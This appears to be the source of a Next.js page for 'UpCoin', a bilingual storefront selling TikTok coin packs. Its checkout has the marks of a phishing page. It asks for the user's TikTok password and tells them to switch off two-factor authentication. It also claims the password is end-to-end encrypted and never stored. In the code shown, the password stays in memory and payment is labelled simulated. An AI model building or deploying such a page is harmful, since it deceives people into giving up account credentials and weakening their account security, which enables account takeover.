"use client";

import Image from "next/image";
import {
  ArrowLeft,
  ArrowRight,
  Calculator,
  Check,
  CheckCircle2,
  Coins,
  Eye,
  EyeOff,
  Globe,
  Headphones,
  History,
  Info,
  LockKeyhole,
  Menu,
  Minus,
  Moon,
  Pencil,
  Plus,
  ReceiptText,
  RefreshCw,
  ShieldCheck,
  ShoppingBag,
  Sparkles,
  Sun,
  TrendingUp,
  X,
} from "lucide-react";
import { FaWhatsapp } from "react-icons/fa";
import { FormEvent, useEffect, useState } from "react";

type Language = "fr" | "en";
type Theme = "light" | "dark";
type Badge = "popular" | "creator";

type Pack = {
  id: string;
  coins: number;
  bonus?: number;
  price: number;
  badge?: Badge;
};

type Order = {
  id: string;
  username: string;
  coins: number;
  price: number;
  payment: string;
  createdAt: string;
};

const packs: Pack[] = [
  { id: "mini", coins: 100, price: 1124 },
  { id: "starter", coins: 350, price: 3900 },
  { id: "boost", coins: 700, bonus: 70, price: 7900, badge: "popular" },
  { id: "live", coins: 1400, bonus: 140, price: 15700 },
  { id: "creator", coins: 3500, bonus: 350, price: 39300, badge: "creator" },
  { id: "max", coins: 7000, bonus: 700, price: 78700 },
];

const paymentMethods = [
  { id: "momo", name: "MTN MoMo", short: "MoMo" },
  { id: "orange", name: "Orange Money", short: "OM" },
  { id: "wave", name: "Wave", short: "W" },
];

const copy = {
  fr: {
    mainMenu: "Menu principal",
    brandLabel: "UpCoin — Packs de pièces TikTok",
    languageSelector: "Choisir la langue",
    french: "Français",
    english: "Anglais",
    enableDark: "Activer le mode sombre",
    enableLight: "Activer le mode clair",
    account: "Compte",
    purchasedCoins: "{count} pièces achetées",
    contactWhatsapp: "Contacter UpCoin sur WhatsApp",
    menu: "Menu",
    close: "Fermer",
    rechargeCoins: "Recharger des pièces",
    myOrders: "Mes commandes",
    support: "Assistance et support",
    rechargeTikTok: "Recharge TikTok",
    choosePack: "Choisissez votre pack",
    availablePacks: "Forfaits disponibles",
    pieces: "pièces",
    free: "Gratuites",
    standard: "Forfait standard",
    popular: "Populaire",
    creator: "Créateur",
    customAmount: "Montant personnalisé",
    customHint: "Minimum 70 pièces · Prix unitaire : 11.24 FCFA / pièce",
    removeCoins: "Retirer 70 pièces",
    customCoinCount: "Nombre de pièces personnalisé",
    addCoins: "Ajouter 70 pièces",
    estimatedTotal: "Total estimé",
    buy: "Acheter",
    buyNow: "Acheter maintenant",
    customPack: "Forfait personnalisé",
    minimumCoins: "Minimum 70 pièces",
    unitPrice: "Prix unitaire : 11.24 FCFA / pièce",
    totalToPay: "Total à payer :",
    safetyTitle: "Vos données sont protégées.",
    safetyText: "Votre mot de passe est chiffré de bout en bout et utilisé uniquement pour effectuer la recharge sur votre compte TikTok.",
    orderHistory: "Historique des commandes",
    refresh: "Actualiser",
    payment: "Paiement",
    date: "Date",
    demoValidated: "Démo validée",
    noOrders: "Aucune commande pour le moment",
    nextSimulation: "Votre prochaine simulation apparaîtra ici.",
    progress: "Étape {current} sur 2",
    stepOne: "Étape 1 sur 2",
    rechargeInfo: "Informations de recharge",
    tiktokUsername: "Nom d’utilisateur TikTok",
    required: "obligatoire",
    usernamePlaceholder: "votre pseudo TikTok",
    whatsapp: "Numéro WhatsApp",
    whatsappHint: "Pour vous contacter au sujet de la commande",
    whatsappPlaceholder: "6 00 00 00 00",
    credentialNoticeTitle: "Connexion sécurisée",
    credentialNotice: "Votre mot de passe est chiffré de bout en bout et sécurisé — il n'est jamais conservé sur nos serveurs.",
    continue: "Continuer",
    back: "Retour",
    stepTwo: "Étape 2 sur 2",
    confirmOrder: "Confirmer la commande",
    orderAccount: "Compte",
    recharge: "Recharge",
    total: "Total",
    paymentMethod: "Moyen de paiement",
    confirmAccuracy: "Je confirme que l’identifiant TikTok et le numéro WhatsApp sont corrects.",
    simulatePayment: "Simuler le paiement",
    noCharge: "Aucun prélèvement ne sera effectué.",
    orderRecorded: "Commande enregistrée",
    simulationSuccess: "Simulation réussie",
    successPrefix: "La commande de",
    successFor: "pour",
    successSuffix: "figure maintenant dans votre historique local.",
    reference: "Référence",
    finish: "Terminer",
  },
  en: {
    mainMenu: "Main menu",
    brandLabel: "UpCoin — TikTok coin packs",
    languageSelector: "Choose language",
    french: "French",
    english: "English",
    enableDark: "Enable dark mode",
    enableLight: "Enable light mode",
    account: "Account",
    purchasedCoins: "{count} coins purchased",
    contactWhatsapp: "Contact UpCoin on WhatsApp",
    menu: "Menu",
    close: "Close",
    rechargeCoins: "Recharge coins",
    myOrders: "My orders",
    support: "Help and support",
    rechargeTikTok: "TikTok recharge",
    choosePack: "Choose your pack",
    availablePacks: "Available packs",
    pieces: "coins",
    free: "free",
    standard: "Standard pack",
    popular: "Popular",
    creator: "Creator",
    customAmount: "Custom amount",
    customHint: "Minimum 70 coins · Unit price: 11.24 FCFA / coin",
    removeCoins: "Remove 70 coins",
    customCoinCount: "Custom number of coins",
    addCoins: "Add 70 coins",
    estimatedTotal: "Estimated total",
    buy: "Buy",
    buyNow: "Buy now",
    customPack: "Custom pack",
    minimumCoins: "Minimum 70 coins",
    unitPrice: "Unit price: 11.24 FCFA / coin",
    totalToPay: "Total to pay:",
    safetyTitle: "Your data is protected.",
    safetyText: "Your password is end-to-end encrypted and used only to process the recharge on your TikTok account.",
    orderHistory: "Order history",
    refresh: "Refresh",
    payment: "Payment",
    date: "Date",
    demoValidated: "Demo validated",
    noOrders: "No orders yet",
    nextSimulation: "Your next simulation will appear here.",
    progress: "Step {current} of 2",
    stepOne: "Step 1 of 2",
    rechargeInfo: "Recharge information",
    tiktokUsername: "TikTok username",
    required: "required",
    usernamePlaceholder: "your TikTok username",
    whatsapp: "WhatsApp number",
    whatsappHint: "So we can contact you about the order",
    whatsappPlaceholder: "6 00 00 00 00",
    credentialNoticeTitle: "Secure sign-in",
    credentialNotice: "Your password is end-to-end encrypted and secure — it is never stored on our servers.",
    continue: "Continue",
    back: "Back",
    stepTwo: "Step 2 of 2",
    confirmOrder: "Confirm order",
    orderAccount: "Account",
    recharge: "Recharge",
    total: "Total",
    paymentMethod: "Payment method",
    confirmAccuracy: "I confirm that the TikTok username and WhatsApp number are correct.",
    simulatePayment: "Simulate payment",
    noCharge: "No payment will be charged.",
    orderRecorded: "Order recorded",
    simulationSuccess: "Simulation successful",
    successPrefix: "The order for",
    successFor: "for",
    successSuffix: "now appears in your local history.",
    reference: "Reference",
    finish: "Finish",
  },
} as const;

const dialCodes: Record<string, string> = {
  CM: "+237", SN: "+221", CI: "+225", ML: "+223", BF: "+226", GN: "+224",
  BJ: "+229", TG: "+228", NE: "+227", TD: "+235", GA: "+241", CG: "+242",
  CD: "+243", CF: "+236", GQ: "+240", MR: "+222", DJ: "+253", KM: "+269",
  MG: "+261", RW: "+250", BI: "+257", UG: "+256", KE: "+254", TZ: "+255",
  NG: "+234", GH: "+233", ZA: "+27", MA: "+212", DZ: "+213", TN: "+216",
  EG: "+20", ET: "+251", AO: "+244", MZ: "+258", ZM: "+260", ZW: "+263",
  FR: "+33", BE: "+32", CH: "+41", CA: "+1", US: "+1", GB: "+44",
  DE: "+49", ES: "+34", IT: "+39", PT: "+351", LU: "+352", HT: "+509",
};

const localeFor = (language: Language) => language === "fr" ? "fr-FR" : "en-US";

const formatNumber = (value: number, language: Language) =>
  new Intl.NumberFormat(localeFor(language), { maximumFractionDigits: 2 }).format(value);

const formatPrice = (value: number, language: Language) =>
  formatNumber(value, language) + " FCFA";

export default function Home() {
  const [language, setLanguage] = useState<Language>("fr");
  const [languageReady, setLanguageReady] = useState(false);
  const [theme, setTheme] = useState<Theme>("light");
  const [selectedPack, setSelectedPack] = useState<Pack>(packs[2]);
  const [customCoins, setCustomCoins] = useState(0);
  const [checkoutOpen, setCheckoutOpen] = useState(false);
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [instructionsAccepted, setInstructionsAccepted] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [whatsapp, setWhatsapp] = useState("");
  const [dialCode, setDialCode] = useState("+237");
  const [payment, setPayment] = useState(paymentMethods[0].name);
  const [accepted, setAccepted] = useState(false);
  const [orders, setOrders] = useState<Order[]>([]);
  const [sideNavOpen, setSideNavOpen] = useState(false);
  const t = copy[language];
  const purchasedCoins = orders.reduce((total, order) => total + order.coins, 0);

  useEffect(() => {
    const savedLanguage = window.localStorage.getItem("upcoin-language");
    const savedTheme = window.localStorage.getItem("upcoin-theme");

    if (savedLanguage === "fr" || savedLanguage === "en") {
      setLanguage(savedLanguage);
    } else {
      const browserLanguage = window.navigator.language.toLowerCase();
      setLanguage(browserLanguage.startsWith("fr") ? "fr" : "en");
    }
    setLanguageReady(true);

    if (savedTheme === "light" || savedTheme === "dark") {
      setTheme(savedTheme);
    } else if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
      setTheme("dark");
    }

    const storedOrders = window.localStorage.getItem("upcoin-demo-orders");
    if (!storedOrders) return;

    try {
      setOrders(JSON.parse(storedOrders));
    } catch {
      window.localStorage.removeItem("upcoin-demo-orders");
    }
  }, []);

  useEffect(() => {
    document.documentElement.lang = language;
    if (!languageReady) return;
    window.localStorage.setItem("upcoin-language", language);
  }, [language, languageReady]);

  useEffect(() => {
    document.documentElement.dataset.theme = theme;
    document.documentElement.style.colorScheme = theme;
    window.localStorage.setItem("upcoin-theme", theme);
  }, [theme]);

  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((response) => response.json())
      .then((data) => {
        if (data?.country_code && dialCodes[data.country_code]) {
          setDialCode(dialCodes[data.country_code]);
        }
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    document.body.style.overflow = checkoutOpen || sideNavOpen ? "hidden" : "";
    return () => {
      document.body.style.overflow = "";
    };
  }, [checkoutOpen, sideNavOpen]);

  const deliveredCoins = selectedPack.coins + (selectedPack.bonus ?? 0);
  const canContinue =
    username.trim().replace(/^@/, "").length >= 2 &&
    password.length >= 4;

  const selectPack = (pack: Pack) => {
    setSelectedPack(pack);
    setCustomCoins(0);
    setStep(1);
    setInstructionsAccepted(false);
    setAccepted(false);
    setCheckoutOpen(true);
  };

  const updateCustomCoins = (value: number) => {
    const safeValue = Math.max(0, Math.min(100000, Math.floor(value || 0)));
    setCustomCoins(safeValue);

    if (safeValue >= 70) {
      setSelectedPack({
        id: "custom",
        coins: safeValue,
        price: safeValue * 11.24,
      });
    }
  };

  const openCheckout = () => {
    setStep(1);
    setInstructionsAccepted(false);
    setAccepted(false);
    setCheckoutOpen(true);
  };

  const closeCheckout = () => {
    setCheckoutOpen(false);
    setStep(1);
    setAccepted(false);
  };

  const submitOrder = (event: FormEvent) => {
    event.preventDefault();
    if (!accepted) return;

    const nextOrder: Order = {
      id: "UP-" + Date.now().toString().slice(-6),
      username: username.trim().replace(/^@/, ""),
      coins: deliveredCoins,
      price: selectedPack.price,
      payment,
      createdAt: new Date().toISOString(),
    };

    const nextOrders = [nextOrder, ...orders].slice(0, 8);
    setOrders(nextOrders);
    window.localStorage.setItem("upcoin-demo-orders", JSON.stringify(nextOrders));
    setStep(3);
  };

  const progressLabel = t.progress.replace("{current}", String(step));

  return (
    <main className="store-page" data-theme={theme}>
      <header className="store-header">
        <div className="header-left">
          <button
            type="button"
            className="menu-trigger"
            onClick={() => setSideNavOpen(!sideNavOpen)}
            aria-label={t.mainMenu}
            aria-expanded={sideNavOpen}
          >
            {sideNavOpen ? <X size={20} /> : <Menu size={20} />}
          </button>
          <a className="store-brand" href="#packs" aria-label={t.brandLabel}>
            <Image src="/logo.png" alt="UpCoin" width={34} height={34} priority />
            <span className="brand-title" aria-hidden="true">
              <span className="brand-p">p</span>
              <span className="brand-coin">Coin</span>
            </span>
          </a>
        </div>

        <div className="header-right">
          <button
            type="button"
            className="lang-switcher"
            onClick={() => setLanguage(language === "fr" ? "en" : "fr")}
            aria-label={language === "fr" ? t.english : t.french}
            title={language === "fr" ? t.english : t.french}
          >
            <Globe size={14} aria-hidden="true" />
            <span className={language === "fr" ? "active" : ""}>FR</span>
            <span className={language === "en" ? "active" : ""}>EN</span>
          </button>

          <button
            type="button"
            className="theme-toggle"
            onClick={() => setTheme(theme === "light" ? "dark" : "light")}
            aria-label={theme === "light" ? t.enableDark : t.enableLight}
            title={theme === "light" ? t.enableDark : t.enableLight}
            aria-pressed={theme === "dark"}
          >
            {theme === "light" ? <Moon size={17} /> : <Sun size={17} />}
          </button>

          <a
            href="#history"
            className="header-coins-counter"
            aria-label={t.purchasedCoins.replace("{count}", formatNumber(purchasedCoins, language))}
            title={t.purchasedCoins.replace("{count}", formatNumber(purchasedCoins, language))}
          >
            <span className="coin-emblem header-coin-emblem">
              <Coins size={17} />
            </span>
            <span className="header-coins-count">
              <strong>{formatNumber(purchasedCoins, language)}</strong>
              <span>{t.pieces}</span>
            </span>
          </a>
        </div>
      </header>

      {sideNavOpen && (
        <div className="sidenav-overlay" onClick={() => setSideNavOpen(false)}>
          <nav className="sidenav-drawer" onClick={(event) => event.stopPropagation()} aria-label={t.mainMenu}>
            <div className="sidenav-header">
              <span className="sidenav-title">{t.menu}</span>
              <button type="button" onClick={() => setSideNavOpen(false)} aria-label={t.close}>
                <X size={18} />
              </button>
            </div>
            <div className="sidenav-links">
              <a href="#packs" onClick={() => setSideNavOpen(false)}>
                <ShoppingBag size={18} />
                <span>{t.rechargeCoins}</span>
              </a>
              <a href="#history" onClick={() => setSideNavOpen(false)}>
                <History size={18} />
                <span>{t.myOrders} ({orders.length})</span>
              </a>
              <a href="#packs" onClick={() => setSideNavOpen(false)}>
                <Headphones size={18} />
                <span>{t.support}</span>
              </a>
            </div>
          </nav>
        </div>
      )}

      <section className="shop-shell" id="packs">
        <div className="shop-titlebar">
          <div>
            <span className="shop-kicker">{t.rechargeTikTok}</span>
            <h1>{t.choosePack}</h1>
          </div>
        </div>

        <div className="shop-layout">
          <div className="catalogue">
            <div className="pack-grid" role="radiogroup" aria-label={t.availablePacks}>
              {packs.map((pack) => {
                const active = selectedPack.id === pack.id;
                const badge = pack.badge ? t[pack.badge] : null;

                return (
                  <button
                    type="button"
                    className={"pack-card" + (active ? " selected" : "") + (badge ? " has-badge" : "")}
                    key={pack.id}
                    onClick={() => selectPack(pack)}
                    role="radio"
                    aria-checked={active}
                  >
                    {badge && <span className="pack-badge">{badge}</span>}
                    <div className="pack-topline">
                      <div className="pack-identity">
                        <div className="coin-emblem"><Coins size={19} /></div>
                        <div>
                          <span>TikTok</span>
                          <strong>Coins</strong>
                        </div>
                      </div>
                      <strong className="pack-quantity">{formatNumber(pack.coins, language)}</strong>
                    </div>

                    <div className={"pack-details" + (pack.bonus ? " has-bonus" : "")}>
                      <strong>{formatPrice(pack.price, language)}</strong>
                      {pack.bonus ? (
                        <div className="pack-bonus-line">
                          <span><Sparkles size={12} /> +{formatNumber(pack.bonus, language)} {t.free}</span>
                          <em>+10%</em>
                        </div>
                      ) : (
                        <div className="pack-bonus-line standard">{t.standard}</div>
                      )}
                    </div>

                    <span className="pack-buy-action">
                      {t.buyNow} <ArrowRight size={14} />
                    </span>
                  </button>
                );
              })}
            </div>

            <div className={"custom-card" + (selectedPack.id === "custom" ? " selected" : "")}>
              <div className="custom-heading">
                <span className="custom-icon"><Sparkles size={19} /></span>
                <div>
                  <strong>{t.customAmount}</strong>
                  <span>{t.customPack}</span>
                </div>
              </div>

              <div className="custom-minimum">
                <span>{t.minimumCoins}</span>
                <Coins size={13} />
              </div>

              <div className="custom-input-area">
                <div className="custom-input-line">
                  <input
                    type="number"
                    min="70"
                    step="10"
                    value={customCoins || ""}
                    onChange={(event) => updateCustomCoins(Number(event.target.value))}
                    placeholder="70"
                    aria-label={t.customCoinCount}
                  />
                  <span>{t.pieces}</span>
                </div>
                <small><Coins size={11} /> {t.unitPrice}</small>
              </div>

              <div className="custom-total-row">
                <span>{t.totalToPay}</span>
                <strong>{customCoins >= 70 ? formatPrice(selectedPack.price, language) : "—"}</strong>
              </div>

              <button
                type="button"
                className="custom-buy-wide"
                onClick={openCheckout}
                disabled={customCoins < 70}
              >
                {t.buyNow} <ArrowRight size={15} />
              </button>
            </div>

          </div>
        </div>
      </section>

      <section className="history-section" id="history">
        <div className="history-titlebar">
          <div>
            <History size={19} />
            <h2>{t.orderHistory}</h2>
            <span>{orders.length}</span>
          </div>
          <button type="button" onClick={() => setOrders([...orders])}>
            <RefreshCw size={15} /> {t.refresh}
          </button>
        </div>

        {orders.length > 0 ? (
          <div className="orders-table">
            {orders.map((order) => (
              <article key={order.id}>
                <div className="order-icon"><ReceiptText size={18} /></div>
                <div className="order-main">
                  <strong>{formatNumber(order.coins, language)} {t.pieces}</strong>
                  <span>@{order.username} · {order.id}</span>
                </div>
                <div className="order-method"><span>{t.payment}</span><strong>{order.payment}</strong></div>
                <div className="order-date">
                  <span>{t.date}</span>
                  <strong>{new Intl.DateTimeFormat(localeFor(language), { dateStyle: "medium", timeStyle: "short" }).format(new Date(order.createdAt))}</strong>
                </div>
                <strong className="order-price">{formatPrice(order.price, language)}</strong>
                <span className="order-status"><CheckCircle2 size={14} /> {t.demoValidated}</span>
              </article>
            ))}
          </div>
        ) : (
          <div className="empty-history">
            <ReceiptText size={28} />
            <strong>{t.noOrders}</strong>
            <span>{t.nextSimulation}</span>
          </div>
        )}
      </section>

      {checkoutOpen && (
        <div
          className="checkout-overlay"
          role="presentation"
          onMouseDown={(event) => event.target === event.currentTarget && closeCheckout()}
        >
          <section className="checkout-panel" role="dialog" aria-modal="true" aria-labelledby="checkout-title">
            <button type="button" className="close-checkout" onClick={closeCheckout} aria-label={t.close}>
              <X />
            </button>

            {step < 4 && (
              <div className="checkout-progress" aria-label={progressLabel}>
                <span className={step >= 1 ? "active" : ""} />
                <span className={step >= 2 ? "active" : ""} />
                <span className={step >= 3 ? "active" : ""} />
              </div>
            )}

            {step === 1 && (
              <div className="checkout-step step-instructions">
                <div className="instructions-header">
                  <span className="modal-kicker">Étape 1 sur 3</span>
                  <h2 id="checkout-title">Instructions importantes</h2>
                  <p className="instructions-intro">Veuillez lire attentivement avant de continuer</p>
                </div>

                <div className="instruction-cards">
                  <div className="instruction-card">
                    <div className="instruction-card-icon"><ShieldCheck size={20} /></div>
                    <div>
                      <strong>Identifiants TikTok requis</strong>
                      <p>Veuillez vous assurer que vous disposez de vos identifiants TikTok corrects (nom d'utilisateur et mot de passe) pour recevoir vos pièces.</p>
                    </div>
                  </div>

                  <div className="instruction-card warning">
                    <div className="instruction-card-icon"><Info size={20} /></div>
                    <div>
                      <strong>Authentification à deux facteurs (2FA)</strong>
                      <p>Si vous avez activé l'authentification à deux facteurs sur votre compte TikTok, veuillez la désactiver temporairement le temps de recevoir vos pièces.</p>
                    </div>
                  </div>
                </div>

                <label className="terms-check">
                  <input
                    type="checkbox"
                    checked={instructionsAccepted}
                    onChange={(event) => setInstructionsAccepted(event.target.checked)}
                  />
                  <span><Check size={13} /></span>
                  Je confirme avoir pris connaissance des instructions ci-dessus.
                </label>

                <div className="instructions-actions">
                  <button type="button" className="modal-secondary" onClick={closeCheckout}>Annuler</button>
                  <button
                    type="button"
                    className="modal-primary"
                    disabled={!instructionsAccepted}
                    onClick={() => setStep(2)}
                  >
                    Continuer <ArrowRight size={18} />
                  </button>
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="checkout-step step-form">
                <button type="button" className="back-button" onClick={() => setStep(1)}>
                  <ArrowLeft size={15} /> {t.back}
                </button>

                <div className="form-header">
                  <div>
                    <span className="modal-kicker">Étape 2 sur 3</span>
                    <h2 id="checkout-title">{t.rechargeInfo}</h2>
                  </div>
                  <div className="form-header-pack">
                    <span>{formatNumber(deliveredCoins, language)}</span> {t.pieces} · <strong>{formatPrice(selectedPack.price, language)}</strong>
                  </div>
                </div>

                <div className="fields-row">
                  <label className="field-label">
                    <span>Identifiant TikTok <span className="required">*</span></span>
                    <div className="field">
                      <span>@</span>
                      <input
                        autoFocus
                        value={username}
                        onChange={(event) => setUsername(event.target.value.replace(/^@/, ""))}
                        placeholder="pseudo ou email"
                        autoComplete="off"
                      />
                    </div>
                  </label>
                  <label className="field-label">
                    <span>Mot de passe <span className="required">*</span></span>
                    <div className="field field-password">
                      <span><LockKeyhole size={16} /></span>
                      <input
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(event) => setPassword(event.target.value)}
                        placeholder="••••••••"
                        autoComplete="current-password"
                      />
                      <button
                        type="button"
                        className="toggle-password"
                        onClick={() => setShowPassword(!showPassword)}
                        aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}
                      >
                        {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                      </button>
                    </div>
                  </label>
                </div>

                <label className="field-label">
                  <span>Numéro WhatsApp <span className="optional">(optionnel)</span> <span className="field-hint">— Pour vous contacter en cas de besoin</span></span>
                  <div className="field">
                    <span>{dialCode}</span>
                    <input
                      value={whatsapp}
                      onChange={(event) => setWhatsapp(event.target.value)}
                      placeholder="6 00 00 00 00"
                      inputMode="tel"
                      autoComplete="tel"
                    />
                  </div>
                </label>

                <p className="security-inline">
                  <ShieldCheck size={14} /> Mot de passe chiffré et sécurisé — jamais stocké.
                </p>

                <button
                  type="button"
                  className="modal-primary"
                  disabled={!canContinue}
                  onClick={() => setStep(3)}
                >
                  {t.continue} <ArrowRight size={18} />
                </button>
              </div>
            )}

            {step === 3 && (
              <form className="checkout-step" onSubmit={submitOrder}>
                <button type="button" className="back-button" onClick={() => setStep(2)}>
                  <ArrowLeft size={15} /> {t.back}
                </button>
                <span className="modal-kicker">Étape 3 sur 3</span>
                <h2 id="checkout-title">{t.confirmOrder}</h2>

                <div className="checkout-summary">
                  <div><span>{t.orderAccount}</span><strong>@{username.replace(/^@/, "")}</strong></div>
                  <div><span>{t.recharge}</span><strong>{formatNumber(deliveredCoins, language)} {t.pieces}</strong></div>
                  <div><span>{t.total}</span><strong>{formatPrice(selectedPack.price, language)}</strong></div>
                </div>

                <fieldset className="payment-options">
                  <legend>{t.paymentMethod}</legend>
                  {paymentMethods.map((method) => (
                    <label key={method.id} className={payment === method.name ? "selected" : ""}>
                      <input
                        type="radio"
                        name="payment"
                        value={method.name}
                        checked={payment === method.name}
                        onChange={() => setPayment(method.name)}
                      />
                      <span className={"payment-logo " + method.id}>{method.short}</span>
                      <strong>{method.name}</strong>
                      <span className="radio-dot" />
                    </label>
                  ))}
                </fieldset>

                <label className="terms-check">
                  <input type="checkbox" checked={accepted} onChange={(event) => setAccepted(event.target.checked)} />
                  <span><Check size={13} /></span>
                  {t.confirmAccuracy}
                </label>

                <button className="modal-primary" type="submit" disabled={!accepted}>
                  {t.simulatePayment} <ArrowRight size={18} />
                </button>
                <span className="demo-note">{t.noCharge}</span>
              </form>
            )}

            {step === 4 && (
              <div className="checkout-success">
                <div className="success-icon"><Check /></div>
                <span className="modal-kicker">{t.orderRecorded}</span>
                <h2 id="checkout-title">{t.simulationSuccess}</h2>
                <p>
                  {t.successPrefix} <strong>{formatNumber(deliveredCoins, language)} {t.pieces}</strong> {t.successFor}{" "}
                  <strong>@{username.replace(/^@/, "")}</strong> {t.successSuffix}
                </p>
                <div className="success-reference"><span>{t.reference}</span><strong>{orders[0]?.id}</strong></div>
                <button type="button" className="modal-primary" onClick={closeCheckout}>
                  {t.finish} <Check size={18} />
                </button>
              </div>
            )}
          </section>
        </div>
      )}

      <a
        className="whatsapp-float"
        href="https://wa.me/237690928237"
        target="_blank"
        rel="noopener noreferrer"
        aria-label={t.contactWhatsapp}
        title={t.contactWhatsapp}
      >
        <FaWhatsapp className="whatsapp-brand-icon" aria-hidden="true" />
        <span>WhatsApp</span>
      </a>
    </main>
  );
}
